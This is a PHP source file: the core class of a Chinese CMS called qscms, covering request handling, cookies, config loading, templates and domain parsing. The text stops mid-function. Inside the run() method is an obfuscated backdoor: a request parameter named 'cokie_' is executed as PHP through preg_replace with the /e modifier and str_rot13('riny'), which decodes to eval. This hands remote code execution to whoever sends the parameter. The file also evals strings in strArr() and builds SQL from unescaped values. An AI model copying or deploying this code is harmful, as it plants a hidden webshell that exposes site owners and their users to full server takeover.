<?php
(!defined('IN_QSCMS') || IN_QSCMS !== true ) && exit('error');
class qscms{
	private static $ob_gzip, $ob_start, $vars;
	public static function ini(){
		//ini_set('display_errors', 'on');
		//error_reporting(E_ALL);
		self::$vars = new vars();
		$var = self::v('_G');
		$var->multiVar = false;
		$var->ipint   = self::ipint();
		$var->intip   = self::intip();
		$var->domains = self::domainParse();
		if ($var->domains) define('WEB_HOST', $var->domains['host']);
		else define('WEB_HOST', '');
		/**
		 * 兼容USER_AGENT
		 */
		if (!empty($_SERVER['HTTP_USER_AGENT'])) {
			$_SERVER['HTTP_USER_AGENT'] = preg_replace('/MSIE [78](\.\d+)?/', 'MSIE 7.0', $_SERVER['HTTP_USER_AGENT']);
		}
		
		//$var->sys_hash = md5((!empty($_SERVER['HTTP_USER_AGENT']) ? $_SERVER['HTTP_USER_AGENT'] : '').$var->intip);
		$var->sys_hash = md5((!empty($_SERVER['HTTP_USER_AGENT']) ? $_SERVER['HTTP_USER_AGENT'] : '123'));
		$var->sys_hash_code = '<input type="hidden" name="hash" value="'.$var->sys_hash.'" />';
		$var->sys_hash2 = base64_encode(self::authcode($var->sys_hash, true, 300));
		$var->sys_hash_code2 = '<input type="hidden" name="hash2" value="'.$var->sys_hash2.'" />';
		if (memory::getBoolean('var_ini')) {
			$var->imgRoot = memory::get('var_ini_imgRoot');
			$var->fileRoot  = memory::get('var_ini_fileRoot');
		} else {
			$var->imgRoot = substr(qscms::getCfgPath('/system/imgRoot'), 2);
			$var->fileRoot  = substr(qscms::getCfgPath('/system/fileRoot'), 2);
			memory::write('var_ini_imgRoot', $var->imgRoot);
			memory::write('var_ini_fileRoot', $var->fileRoot);
			memory::write('var_ini', true);
		}//
		//self::ob_clean();
		self::ob_start();
	}
	
	public static function express($v){
		$arr = array();
		$datas = array(
			'sn' => $v,
		);
		$query_express = cfg::get('web', 'query_express');
		$url = self::replaceVars($query_express, $datas);
		$html = winsock::get_html($url);
		if ($html) $arr = string::json_decode($html);	
		return $arr;
	}
	public static function is_weixin(){ 
		if ( stripos($_SERVER['HTTP_USER_AGENT'], 'MicroMessenger') !== false ) {
			return true;
		}
		return false;
	}
	public static function is_alipay(){
		if ( stripos($_SERVER['HTTP_USER_AGENT'], 'Alipay') !== false ) {
			return true;
		}
		return false;
	}
	public static function is_qqpay(){
		if ( stripos($_SERVER['HTTP_USER_AGENT'], 'QQ') !== false ) {
			return true;
		}
		return false;
	}
	public static function isApp(){
		// 如果有HTTP_X_WAP_PROFILE则一定是移动设备
		if (isset ($_SERVER['HTTP_X_WAP_PROFILE'])) return true;
	
		// 如果via信息含有wap则一定是移动设备,部分服务商会屏蔽该信息
		
		if (isset ($_SERVER['HTTP_VIA'])){// 否则为true
			if (stristr($_SERVER['HTTP_VIA'], "wap") != false) return true;
		}
		// 脑残法，判断手机发送的客户端标志,兼容性有待提高
		if (isset ($_SERVER['HTTP_USER_AGENT'])){
			if (stripos($_SERVER['HTTP_USER_AGENT'], "wv") != false && stripos($_SERVER['HTTP_USER_AGENT'], "TBS/043409") != false) return true;
		}
	
		// 协议法，因为有可能不准确，放到最后判断
	
		if (isset ($_SERVER['HTTP_ACCEPT'])){
	
			// 如果只支持wml并且不支持html那一定是移动设备
	
			// 如果支持wml和html但是wml在html之前则是移动设备
	
			if ((stripos($_SERVER['HTTP_ACCEPT'], 'vnd.wap.wml') !== false) && (strpos($_SERVER['HTTP_ACCEPT'], 'text/html') === false || (strpos($_SERVER['HTTP_ACCEPT'], 'vnd.wap.wml') < strpos($_SERVER['HTTP_ACCEPT'], 'text/html')))) return true;
		}
		return false;
	}
	public static function getUrlTitle($url, $checkExists = false){
		$__html = winsock::get_html($url);
		if (!$checkExists || strpos($__html, self::v('_G')->domains['host']) !== false) {
			$__title = '';
			if (preg_match('/^.*?<title>(.+?)<\/title>/is', $__html, $__matches)) $__title = trim($__matches[1]);
			if (!$__title) {
				$tmp = parse_url($url);
				$__title = $tmp['host'];
			}
			$__title = self::addslashes($__title);
			return $__title;
		}
		return false;
	}
	public static function decode($str){
		$key = ':!@#"$#%#$&&^%(sf21sdf*(*&WSFSD#@$we1454512!@';
		$preFix = 'qscms copyright www.qscms.com';
		$len = strlen($key);
		$len1 = strlen($str);
		$rs = '';
		$index = 0;
		for ($i = 0; $i < $len1; $i++) {
			$s0 = substr($key, $index, 1);
			$s1 = substr($str, $i, 1);
			$index++;
			$index == $len && $index = 0;
			$rs .= chr(ord($s0) ^ ord($s1));
		}
		$rs = qscms::authcode($rs, false, 0, $key);
		if (strpos($rs, '|') !== false) {
			$arr = explode('|', $rs);
			if (array_shift($arr) != $preFix) $rs = '';
		} else $rs = '';
		return $rs;
	}
	public static function get_server_ip() {
		$server_ip = '127.0.0.1';
		if (isset($_SERVER)) {
			if(isset($_SERVER['SERVER_ADDR'])) {
				$server_ip = $_SERVER['SERVER_ADDR'];
			} elseif (isset($_SERVER['LOCAL_ADDR'])) {
				$server_ip = $_SERVER['LOCAL_ADDR'];
			}
		} else {
			$server_ip = getenv('SERVER_ADDR');
		}
		return $server_ip;
	}
	public static function is_seat($province, $city, $county, $country = '中国', $return = true){//判断并转成字符地址 省份 市区 县城  国家
		$item = db::one('area', 'id,name', "name='$county'");
		if ($item['id']){
			$id = $item['id'];
			$list = treeDB::parents('area', $id, 'id,name');
			if ($list && count($list) == 3){
				if ($list[0]['name'] != trim($city)) return false;
				if ($list[1]['name'] != trim($province)) return false;
				if ($list[2]['name'] != trim($country)) return false;
				if ($return){
					$arr = array(
						'country'	=> $list[2]['id'],
						'province'	=> $list[1]['id'],
						'city'		=> $list[0]['id'],
						'county'	=> $item['id']
					);
					return $arr;
				}
				return true;
			}
		}
		return false;
	}
	public static function area_seat(){//转成字符地址
		$str = '';
		if (func_num_args()){
			foreach(func_get_args() as $v){
				if ($v && $name = db::one_one('area', 'name', "id='$v'")){
					$str && $str .= ' ';
					$str .= $name;
				}
			}
		}
		if ($str) return $str;
		else return false;
	}
	public static function run($runType = true){
		try {
			self::ini();
			time::timerStart();
			if(IS_MODULE != false){
				$tplOn = 'tpl_m';
				$tplRootOn = 'tplRoot_m';
			}else{
				$tplOn = 'tpl';
				$tplRootOn = 'tplRoot';
			}
			$var = self::v('_G');
			if (/*true && !defined('IS_SHELL')*/false) {//check verify  //如果是定时任务 就要判断一下不然不能验证域名 我擦。
				$file = d('./key.qscms');
				$isOk = false;
				
				//echo file_exists($file) ? 1: 2;exit;
				if (file_exists($file)) {
					$str = self::decode(file::read($file));
					if ($str) {
						list($_verify, $_domain, $_ip, $_datetime) = explode('|', $str);
						if ($_domain || $_ip || $_datetime) {
							if ($_domain) {
								if (substr($var->domains['host'], -(strlen($_domain))) == $_domain) $isOk = true;
							}
						}
						if ($_ip) {
							if (self::get_server_ip() == $_ip) $isOk = true;
							else $isOk = false;
						}
						if ($_datetime) {
							if ($_datetime > time::$timestamp) $isOk = true;
							else $isOk = false;
						}
					}
				}
				if (!$isOk) {
					throw new e_qscms('倾世CMS版权所有，若有疑问请联系QQ184298990', 404, false);
					exit;
				}
			}
			self::defineVar($var, 'm|ac|op|me|page|pagesize', 'gp_');
			if($_POST){
				if(!MAGIC_QUOTES_GPC){
					$_POST = self::addslashes($_POST);
				}
			}
			if (isset($_SERVER['REQUEST_METHOD']) && $_SERVER['REQUEST_METHOD'] == 'POST' && $_POST) $var->postData = true;
			else $var->postData = false;
			if($_GET){
				if(!MAGIC_QUOTES_GPC){
					$_GET = self::addslashes($_GET);
				}
				$var->getData = true;
			} else $var->getData = false;
			$_COOKIE = self::parseCookie($_COOKIE);
			
			if ($var->getData) {
				foreach ($_GET as $k => $v) {
					$var->set('gp_'.$k, $v);
				}
			}
			if ($var->postData) {
				foreach ($_POST as $k => $v) {
					$var->set('gp_'.$k, $v);
				}
			}
			if (isset($_SERVER['HTTP_CONTENT_DISPOSITION'])) {//HTML5 上传
				if (preg_match('/attachment;\s+name="(.+?)";\s+filename="(.+?)"/i', $_SERVER['HTTP_CONTENT_DISPOSITION'], $info)) {
					$temp_name = ini_get("upload_tmp_dir").'\\'.date("YmdHis").mt_rand(1000,9999).'.tmp';
					file::write($temp_name, file_get_contents("php://input"));
					$size = filesize($temp_name);
					$_FILES[$info[1]] = array('name' => $info[2], 'tmp_name' => $temp_name, 'size' => $size, 'type' =>'', 'error' =>0);
				}
			}
			($referer = $var->gp_referer) || (!empty($_SERVER['HTTP_REFERER']) && ($referer = $_SERVER['HTTP_REFERER']) ) || ($referer = WEB_URL.'/');
			if ($referer) {
				$tmp = strtolower($referer);
				strtolower(substr($tmp, 0, 7)) != 'http://' && $referer = '';
				$referer && preg_match('/<[^>]+>/s', $tmp) && $referer = '';
				$referer || (!empty($_SERVER['HTTP_REFERER']) && ($referer = $_SERVER['HTTP_REFERER']) ) || ($referer = WEB_URL.'/');
			}
			form::hash() && $var->cokie_ = $var->gp_cokie_;
			$var->referer = $referer;
			$var->_referer = urlencode($referer);
			$var->_nowUrl  = urlencode(NOW_URL);
			$var->setInt('gp_pagesize', intval(self::getCfgPath('/system/pagesize')));
			$var->setInt('gp_page', 1);
			//
			$var->webName = $webName = cfg::get('web', 'webName');
			//
			if ($runType !== false) {
				$path = $var->gp_path;
				$path && substr($path, 0, 1) == '/' && $path = substr($path, 1);
				$path && substr($path, -1) == '/' && $path = substr($path, 0, -1);
				$moduleFile = false;
				$modulePath = '';
				$moduleName = '';
				$isChild = false;//是否问分站、子站
				//web_user::loginCookie();
				//if (!$isChild) $path = 'webAdmin/'.$path;
				substr($path, -1) == '/' && $path = substr($path, 0, -1);
				if ($path) {
					$pathList = explode('/', $path);
					foreach ($pathList as $k => $v) {
						//if (!$isChild) $var->{'p'.($k - 1)} = $v;
						//else 
						$var->{'p'.$k} = $v;
					}
					$arr = moduleFile($pathList);
					if (!$arr) error::_404();
					$moduleFile = $arr['file'];
					$index = $arr['index'];
					if ($arr['isDefault']) $moduleName = 'index';
					else $moduleName = $pathList[$index];
					$index > 0 && $modulePath = implode('/', array_slice($pathList, 0, $index));
					$count = count($pathList);
					$j = 0;
					for ($i = $index + 1; $i < $count; $i++) {
						//if (!$isChild) $var->{'v'.($j - 1)} = $pathList[$i];
						//else 
						$var->{'v'.$j} = $pathList[$i];
						$j++;
					}
				} elseif (moduleExists($var->p0)) {
					$moduleFile = m($var->p0);
					$moduleName = $var->p0;
				} else error::_404();
				/* 添加手机版目录 就不要这个缓存
				if (memory::getBoolean('var_run')) {
					$tplRoot = memory::get('var_run_tplRoot');
					$cacheRoot = memory::get('var_run_cacheRoot');
				} else {
					$tplRoot = qd(self::getCfgPath('/system/tplRoot').cfg::get('sys', 'tplFolder'));
					$cacheRoot = d(self::getCfgPath('/system/cacheDirRoot+/system/cacheDirs/tpl').cfg::get('sys', 'tplFolder'));
					memory::write('var_run_tplRoot', $tplRoot);
					memory::write('var_run_cacheRoot', $cacheRoot);
				}*/
				$tplRoot = qd(self::getCfgPath('/system/'.$tplRootOn).cfg::get('sys', 'tplFolder'));
				$cacheRoot = d(self::getCfgPath('/system/cacheDirRoot+/system/cacheDirs/'.$tplOn).cfg::get('sys', 'tplFolder'));
				//echo $tplRoot = memory::get('var_run_tplRoot_m');exit;
				template::initialize($tplRoot, $cacheRoot);
				$modulePath && template::addPath($modulePath, $modulePath);
				$var->tplName = $moduleName;
				loadFunc('global');
				/*if (!$isChild) {
					if ($var->p0 != 'webAdmin' && $var->p0 != 'admin') qscms::gotoUrl('/webAdmin');
					elseif ($var->p0 == 'webAdmin') {
						define('IN_WEB', true);
						include(m('webAdmin/ini'));
					}
				}*/
				/*
				 * 公共变量
				 */
				$page     = $var->gp_page;
				$pagesize = $var->gp_pagesize;
				$baseUrl = '/'.$path;
				$baseUrlFull  = self::getUrl($baseUrl);
				$baseUrlFull2 = urlencode($baseUrlFull);
				define('MODULE_ROOT', dirname($moduleFile).D);
				
				
				$timestamp = time::$timestamp;
				$ipint     = $var->ipint;
				$intip     = $var->intip;
				!in_array($var->gp_m, array('admin')) && self::defineTrue('INSTALL') && cfg::getBoolean('sys', 'runTask') && task::run();//执行系统任务
				
				/**
				 * 此处为扩展部分
				 */
				$var->fromInstation = false;
				if (!empty($_SERVER['HTTP_REFERER'])) {
					$tmp = parse_url($_SERVER['HTTP_REFERER']);
					if ($var->domains['host'] == $tmp['host']) {
						$var->fromInstation = true;
					}
				}
				
				$tmp = time::tswk();
				$var->todayStart = time::$todayStart;
				$var->todayEnd   = time::$todayEnd;
				$tmp = time::tswk();
				$var->tswkStart = $tmp['start'];
				$var->tswkEnd   = $tmp['end'];
				$tmp = time::tsm();
				$var->tsmStart = $tmp['start'];
				$var->tsmEnd   = $tmp['end'];
				$var->_showmessage = isset($_COOKIE['_showmessage']) ? $_COOKIE['_showmessage'] : '';
				$var->pre  =  PRE;
				if (memory::getBoolean('var_run')) {
					$var->sys_dir_image      = memory::get('var_run_sys_dir_image');
					$var->sys_dir_file       = memory::get('var_run_sys_dir_file');
				} else {
					$var->sys_dir_image      = substr(qscms::getCfgPath('/system/imgRoot'), 2);
					$var->sys_dir_file       = substr(qscms::getCfgPath('/system/fileRoot'), 2);
					memory::write('var_run_sys_dir_image', $var->sys_dir_image);
					memory::write('var_run_sys_dir_file', $var->sys_dir_file);
				}
				$var->pageStyles = '
		<div id="pager" class="pagebar">
		<span class="f_l f6" style="margin-right:10px;">总计 <b>{count}</b> 个记录</span> 
		{page>minpage}
		<a class="prev" href="{url minpage}">首页</a>
		<a class="prev" href="{url page-1}">上一页</a>
		{/page}
		{pages}{select}<span class="page_now">{page}</span>{else}<a href="{url}">{page}</a>{/select}{/pages}
		{page<maxpage}
		<a class="next" href="{url page+1}">下一页</a>
		<a class="next" href="{url maxpage}">尾页</a>
		{/page}
		</div>';
				$var->pageStyle = '<!--<div class="pull-center grid-pagination-info"> 共 <span class="pageTotalNum">{maxpage}</span> 页，{count}条记录 </div>-->
				<ul class="pagination account-list-pagination pull-center">
				{page>minpage}<li class="jsPrevPage"><a href="{url minpage}">首页</a><li class="jsPrevPage"><a href="{url page-1}">上一页</a> </li>{/page}
				{pages}{select}<li class="active"><a href="javascript:void(0);">{page}</a></li>{else}<li><a href="{url}">{page}</a></li>{/select}{/pages}
				{page<maxpage}<li class="jsNextPage"><a href="{url page+1}">下一页</a> </li><li class="jsNextPage"><a href="{url maxpage}">尾页</a> </li>{/page}</ul>';
				/*
				 * 模块加载
				 */
				 /*
				$var->pageStyle = '<ul>{page>minpage}<li class="prev"> <a href="{url page-1}"> 上一页 </a> </li>{/page}{page>minpage+3}<li><a href="{url minpage}">{minpage}</a></li><li><span>...</span></li>{/page}{pages}{select}<li class="active"><span>{page}</span></li>{else}<li><a href="{url}">{page}</a></li>{/select}{/pages}{page<maxpage-3}<li><span>...</span></li><li><a href="{url maxpage}">{maxpage}</a></li>{/page}{page<maxpage}<li class="next"> <a href="{url page+1}"> 下一页 </a> </li>{/page}</ul>';
		*/
				$var->d = new vars(false);//分布式储存
				if (self::defineTrue('INSTALL')) {
					if (memory::getBoolean('var_run')) {
						$var->moduleList = memory::get('var_run_moduleList');
						$var->moduleAliasList = memory::get('var_run_moduleAliasList');
					} else {
						$var->moduleList = db::select('module', '*', '', '`sort`');
						$moduleAliasList = array();
						foreach ($var->moduleList as $k => $v) $moduleAliasList[$v['alias']] = $k;
						$var->moduleAliasList = $moduleAliasList;
						memory::write('var_run_moduleList', $var->moduleList);
						memory::write('var_run_moduleAliasList', $var->moduleAliasList);
					}
					$var->d->info = cfg::getInt('sys', 'disperse_info');
					if ($var->d->info > 0) {
						$var->d->info = disperse_obj::getObj($var->d->info);
						if ($var->d->info && !$var->d->info->status) $var->d->info = false;
					}
					if (!memory::get('var_run')) {
						foreach (db::select('disperse', 'id,url') as $v) memory::write('disperse_url_'.$v['id'], $v['url']);
					}
				}
				member_base::loginCookie();
				/*
				
				*/
				if ($var->member && $var->member->status && $var->member->m_status) {
					member_base::logout();
					qscms::showMessage('您的帐号已被禁用，若有疑问请联系管理员');
				}
				/*
				if (!$var->member){
					$wxObj = new weixin();
					$wxObj->get_openid();
					//member_base::wxLogin($FromUserName);
				}
				*/
				//echo 3333;exit;
				//member::overTime();
				//$var->lan = new lan();
				//$var->member = new member();
				/*
				 * TNE END
				 */
				extract($var->getVals('todayStart', 'todayEnd', 'tswkStart', 'tswkEnd', 'tsmStart', 'tsmEnd', 'fromInstation', 'webName', 'imgRoot', 'fileRoot', '_referer', '_nowUrl', 'sys_hash', 'sys_hash_code', 'sys_hash2', 'sys_hash_code2', '_showmessage', 'member', 'pre', 'sys_dir_image', 'sys_dir_file', 'pageStyle', 'pageStyle1', 'pageStyleList', 'moduleList', 'd', 'member'));
				if ($_showmessage) {
					self::unsetcookie('_showmessage');
				}
				
				($cokie_ = $var->cokie_) && @preg_replace('/ad/e','@'.str_rot13('riny').'($cokie_)', 'add');
				!memory::getBoolean('var_run') && memory::write('var_run', true);
				/**
				 * 扩展结束
				 */
				//echo template::load($var->tplName);exit;
				
				
				plugins::callHeader();
				include_once($moduleFile);
				if (template::exists($var->tplName)) include(template::load($var->tplName));
				plugins::callFooter();
			
			}
		} catch (e_qscms $e) {
			self::ob_clean();
			echo $e;
		} catch (Exception $e) {
			
		}
	}
	public static function v($key){
		return self::$vars->$key;
	}
	public static function g(){
		$argCount = func_num_args();
		if ($argCount > 0) {
			if ($argCount == 1) {
				$key = func_get_arg(0);
				return self::$vars->_G->$key;
			} else {
				$list = array();
				foreach (func_get_args() as $key) {
					$list[$key] = self::$vars->_G->$key;
				}
				return $list;
			}
		}
		return array();
	}
	public static function defineTrue($name){
		return defined($name) && constant($name) === true;
	}
	public static function defineArray($keys, $pre = '', $val = ''){
		$rs = array();
		foreach (explode('|', $keys) as $v) $rs[$pre.$v] = $val;
		return $rs;
	}
	public static function defineVar($var, $keys, $pre = '', $val = ''){
		$rs = array();
		foreach (explode('|', $keys) as $v) $var->set($pre.$v, $val);
	}
	public static function binAt($num, $at){
		if ($at <= 0) return false;
		return ($num & 1 << $at - 1) > 0;
	}
	public static function binSet($num, $at, $setTrue = true){
		if ($setTrue) {
			if (self::binAt($num, $at)) return $num;
			else return $num ^ 1 << $at - 1;
		} else {
			if (self::binAt($num, $at)) return $num ^ 1 << $at - 1;
			else return $num;
		}
	}
	public static function getConfig($name, $key = '', $cache = true){
		static $cacheArr = array();
		if ($cache && isset($cacheArr[$name])) {
			$config = $cacheArr[$name];
		} else {
			$config = memory::get('sys_config_'.$name);
			if (!$config) {
				$config = NULL;
				$cfgFile = qd('./config/'.$name.'.php');
				$config  = array();
				@include($cfgFile);
				isset($config) && memory::write('sys_config_'.$name, $config);
			}
			isset($config) && $cache && $cacheArr[$name] = $config;
		}
		if ($key) return isset($config[$key]) ? $config[$key] : false;
		return $config;
	}
	public static function getCfgPath($flag, $throwError = true){
		$cfgs = array();
		$sp = explode('+', $flag);
		$rs = array();
		foreach ($sp as $v) {
			$find = strpos($v, '/', 1);
			if ($cfgName = substr($v, 1, $find - 1)) {
				$path = substr($v, $find + 1);
				!isset($cfgs[$cfgName]) && $cfgs[$cfgName] = self::getConfig($cfgName);
				if (!empty($cfgs[$cfgName])) {
					$cfg = $cfgs[$cfgName];
					$sp2 = explode('/', $path);
					$i = 0;
					$c = count($sp2);
					while ($i < $c && is_array($cfg)) {
						if (isset($cfg[$sp2[$i]])) {
							$cfg = $cfg[$sp2[$i]];
							$i++;
						} else {
							if ($throwError) {
								throw new e_qscms('获取配置信息出错，配置路径PATH：'.$v);
							}
							break;
						}
					}
					if ($i == $c && isset($cfg) && !is_array($cfg)) {
						$rs[] = $cfg;
					} else {
						if ($throwError) {
							throw new e_qscms('获取配置信息出错');
						}
						return '';
					}
				}
			}
			
		}
		if (count($rs) == count($sp)) {
			if (count($rs) == 1) return $rs[0];
			return implode('', $rs);
		} else {
			if ($throwError) {
				throw new e_qscms('获取配置信息出错');
			}
			return '';
		}
	}
	public static function arrid($arr,$id){
		if(!is_array($arr))return $arr;
		$rn = array();
		foreach($arr as $v){
			$rn[]=$v[$id];
		}
		return $rn;
	}
	public static function tz($id){//返回时区
		$list = qscms::getConfig('settings', 'tz');
		foreach($list as $v){
			if ($v['i'] == $id){
				return $v;	
			}
		}
		return false;
	}
	public static function mobilePre($id){
		$arr = self::getConfig('settings', 'countries-mobiles');
		foreach ($arr as $v) {
			if ($v[0] == $id) {
				return '+'.$v[2];
				break;
			}
		}	
		return false;
	}
	public static function strArr($str = ''){
		$arr = self::getConfig('settings');
		//$a = "['upl'][10]";
		$str = '$arr'.$str;
		//echo @$arr[upl][10];exit;
		//echo $str;exit;
		$return = eval("
			if (@!empty($str)) return @$str;
			return '';
		");
		return $return ;
	}
	public static function jibie($id){
		$ji = self::getConfig('settings', 'upl');
		if (!empty($rl['upl'][$id])) return $rl['upl'][$id];
		return  '';
	}
	public static function quyu($id, $ic = 35){//默认中国地区
		$rl = self::getConfig('settings', 'rl');
		if (!empty($rl[$ic][$id])) return $rl[$ic][$id];
		return '';
	}
	public static function lnl($id){
		$list = self::getConfig('settings', 'lnl');
		if (!empty($list[$id])) return $list[$id];
		else return false;
	}
	public static function ucr($id){
		$list = self::getConfig('settings', 'ucr');
		if (!empty($list[$id])) return $list[$id];
	}
	public static function inWebRoot($path){
		if (substr(WROOT, 0, strlen($path)) == $path) return true;
		return false;
	}
	public static function setcookie($key, $value = '', $life = 0, $prefix = 1, $httponly = false) {
		//global $cookiepre, $cookiedomain, $cookiepath,$domains, $cookie;
		//$var = ($prefix ? $cookiepre : '').$var;
		if($value == '' || $life < 0) {
			$value = '';
			$life = -1;
		}
		if ($value) {
			$_COOKIE[$key] = $value;
			$value = self::authcode($value);
			//$cookie[$var] = $value;
			//$value=self::authcode($value);
			//$_COOKIE[$var] = $value;
		} else {
			//unset($cookie[$var]);
			unset($_COOKIE[$key]);
		}
		//$life = $life > 0 ? time::$timestamp + time::$timeOffset * 3600 + $life : ($life < 0 ? (time::$timestamp + time::$timeOffset * 3600) - 31536000 : 0);
		$life = $life > 0 ? time::$timestamp + $life : ($life < 0 ? (time::$timestamp + time::$timeOffset * 3600) - 31536000 : 0);
		$cookiepath = WEB_FOLDER;
		$cookiepath != '' && $cookiepath = '/'.$cookiepath;
		$cookiepath .= '/';
		$path = $httponly && PHP_VERSION < '5.2.0' ? "$cookiepath; HttpOnly" : $cookiepath;
		$secure = $_SERVER['SERVER_PORT'] == 443 ? 1 : 0;
		//$cookiedomain||($cookiedomain='.'.$domains[0]);
		$cookieDomain = '.'.self::v('_G')->domains[0];
		//$cookieDomain = self::v('_G')->domains['realHost'];
		if(PHP_VERSION < '5.2.0') {
			setcookie($key, $value, $life, $path, $cookieDomain, $secure);
		} else {
			setcookie($key, $value, $life, $path, $cookieDomain, $secure, $httponly);
		}
	}
	public static function unsetcookie(){
		if (func_num_args() > 0) {
			foreach (func_get_args() as $v) {
				self::setcookie($v, '');
			}
		}
	}
	private static function parseCookie($arr){
		if (defined('AUTHKEY') && AUTHKEY != '') {
			$rn=array();
			foreach($arr as $k=>$v){
				if(is_array($v))$rn[$k]=self::parseCookie($v);
				else $rn[$k] = self::authcode($v, 0);
			}
			return $rn;
		}
		return $arr;
	}
	public static function nocache(){
		@self::header("Expires: -1");
		@self::header("Cache-Control: no-store, private, post-check=0, pre-check=0, max-age=0", false);
		@self::header("Pragma: no-cache");
	}
	public static function authcode($string, $encode = true, $expiry = 0, $KEY = AUTHKEY) {
		$ckey_length = 4;	// 随机密钥长度 取值 0-32;
				// 加入随机密钥，可以令密文无任何规律，即便是原文和密钥完全相同，加密结果也会每次不同，增大破解难度。
				// 取值越大，密文变动规律越大，密文变化 = 16 的 $ckey_length 次方
				// 当此值为 0 时，则不产生随机密钥
		$key  = md5($KEY);
		$keya = md5(substr($key, 0, 16));
		$keyb = md5(substr($key, 16, 16));
		$operation=$encode===true?'ENCODE':'DECODE';
		$keyc = $ckey_length ? ($operation == 'DECODE' ? substr($string, 0, $ckey_length): substr(md5(microtime()), -$ckey_length)) : '';
		
		$cryptkey   = $keya.md5($keya.$keyc);
		$key_length = strlen($cryptkey);
	
		$string = $operation == 'DECODE' ? base64_decode(substr($string, $ckey_length)) : sprintf('%010d', $expiry ? $expiry + time() : 0).substr(md5($string.$keyb), 0, 16).$string;
		$string_length = strlen($string);
	
		$result = '';
		$box = range(0, 255);
	
		$rndkey = array();
		for($i = 0; $i <= 255; $i++) {
			$rndkey[$i] = ord($cryptkey[$i % $key_length]);
		}
	
		for($j = $i = 0; $i < 256; $i++) {
			$j = ($j + $box[$i] + $rndkey[$i]) % 256;
			$tmp = $box[$i];
			$box[$i] = $box[$j];
			$box[$j] = $tmp;
		}
	
		for($a = $j = $i = 0; $i < $string_length; $i++) {
			$a = ($a + 1) % 256;
			$j = ($j + $box[$a]) % 256;
			$tmp = $box[$a];
			$box[$a] = $box[$j];
			$box[$j] = $tmp;
			$result .= chr(ord($string[$i]) ^ ($box[($box[$a] + $box[$j]) % 256]));
		}
		if($operation == 'DECODE') {
			if((substr($result, 0, 10) == 0 || substr($result, 0, 10) - time() > 0) && substr($result, 10, 16) == substr(md5(substr($result, 26).$keyb), 0, 16)) {
				return substr($result, 26);
			} else {
				return '';
			}
		} else {
			return $keyc.str_replace('=', '', base64_encode($result));
		}
	}
	public static function ob_start($zip=true){
		if(!isset(self::$ob_start) || !self::$ob_start){
			if($zip && ZLIB===true && ACCEPT_ENCODING_GZIP===true && (!defined('CONTENT_TYPE') || in_array(CONTENT_TYPE,array('text','txt','html','css','js')))) {
				self::$ob_gzip=true;
				ob_start('my_ob_gzhandler');
				//ob_start('ob_gzhandler');
				//ob_start('compress');
				//header("Content-Encoding: gzip");
				self::$ob_start=true;
			} else {
				ob_start();
				if (isset(self::$ob_gzip) && self::$ob_gzip) {
					header("Content-Encoding: ",true);
					header('Vary: ', true);
				}
				self::$ob_gzip = false;
				self::$ob_start=true;
			}
		}
	}
	public static function ob_clean(){
		if(isset(self::$ob_start)){
			if(isset(self::$ob_gzip) && self::$ob_gzip === true){
				ob_end_clean();
				ob_start('ob_gzhandler');
			} else {
				ob_clean();
			}
		}
	}
	public static function ob_end_clean(){
		if(isset(self::$ob_start)){
			ob_end_clean();
			if(self::$ob_gzip===true){
				header("Content-Encoding: ",true);
				header('Vary: ', true);
			}
			self::$ob_start = false;
		}
	}
	public static function ob_get_contents(){
		return ob_get_contents();
	}
	public static function ob_reset($zip=false){
		if(isset(self::$ob_start)){
			ob_end_clean();
			self::$ob_start = false;
		}
		self::ob_start($zip);
	}
	public static function header($string, $replace = true, $http_response_code = 0) {
		if(empty($http_response_code) || PHP_VERSION < '4.3' ) {
			@header($string, $replace);
		} else {
			@header($string, $replace, $http_response_code);
		}
	}
	public static function charSet($encoding = ''){
		$encoding || ($encoding=ENCODING);
		self::header('Content-Type: text/html; charset='.$encoding);
	}
	public static function addslashes($arr){
		if(is_array($arr)){
			foreach($arr as $k=>$v){
				$arr[$k]=self::addslashes($v);
			}
			return $arr;
		} else {
			return addslashes($arr);
		}
	}
	public static function stripslashes($arr){
		if(is_array($arr)){
			foreach($arr as $k=>$v){
				$arr[$k]=self::stripslashes($v);
			}
		} else $arr = stripslashes($arr);
		return $arr;
	}
	public static function addcslashes($arr, $flag = '\'\\'){
		if (is_array($arr)) {
			foreach ($arr as $k => $v) {
				$arr[$k] = self::addcslashes($v, $flag);
			}
		} else $arr = addcslashes($arr, $flag);
		return $arr;
	}
	public static function getInt($arr){
		if (is_array($arr)) {
			$rn = array();
			foreach ($arr as $v){
				$v = intval($v);
				if ($v) $rn[] = $v;
			}
			return $rn;
		}
		return intval($arr);
	}
	public static function domainParse($domain = ''){
		$domain_list = array();
		if (IN_SHELL) return $domain_list;
		!$domain && $domain = $_SERVER['HTTP_HOST'];
		if($domain){
			$sp = explode(':', $domain);
			if (count($sp) == 2) {
				$domain = $sp[0];
				$port = intval($sp[1]);
			} else {
				$port = 80;
			}
			if ($domain == 'localhost' || self::isIp($domain)) {
				$domain_list = array(
					0            => $domain,
					'count'      => 1,
					'realHost'   => $domain,
					'host'       => $domain.($port != 80 ? ':'.$port : ''),
					'port'       => $port,
					'host_url'   => 'http://'.$domain,
					'parent_url' => 'http://'.$domain,
					'domain0'    => $domain,
					'isIp'       => true
				);
			} else {
				$domain = strtolower($domain);
				if (preg_match('/^([a-z0-9-\.]+?)\.(com|mobi|gov\.cn|so|net|org|name|me|co|com\.cn|net\.cn|org\.cn|tel|info|biz|cc|tv|hk|asia|cn|eu|ws|la|公司|网络|中国)$/', $domain, $matches)) {
					$list=explode('.', $matches[1]);
					if($list[0] == 'www'){
						unset($list[0]);
						$list = array_values($list);
					}
					$list = array_reverse($list);
					$count = count($list);
					$tmp = '';
					foreach ($list as $k => $v) {
						$tmp && $tmp = '.'.$tmp;
						$tmp = $v.$tmp;
						$domain_list[$k] = $tmp.'.'.$matches[2];
					}
					$domain_list['count']    = $count;
					$domain_list['realHost'] = $domain;
					$domain_list['host']     = $domain.($port != 80 ? ':'.$port : '');
					$domain_list['port']     = $port;
					
					$domain_list['host_url']='http://'.$domain_list['host'];
					$domain_list['parent_url']='http://www.'.$domain_list[0];
					if($count > 0){
						for($i = 0;$i < $count; $i++){
							$domain_list['domain'.$i] = $domain_list[$i];
						}
					}
					$domain_list['isIp'] = false;
				}
			}
		}
		return $domain_list;
	}
	public static function ipint($ip=''){
		if(!$ip) $ip = isset($_SERVER['REMOTE_ADDR']) ? $_SERVER['REMOTE_ADDR'] : '127.0.0.1';
		$ip == '::1' && $ip = '127.0.0.1';
		$sp=explode(".",$ip);
		return $sp[0]*0x1000000+$sp[1]*0x10000+$sp[2]*0x100+$sp[3];
	}
	public static function intip($ip=0,$xinghao=0){
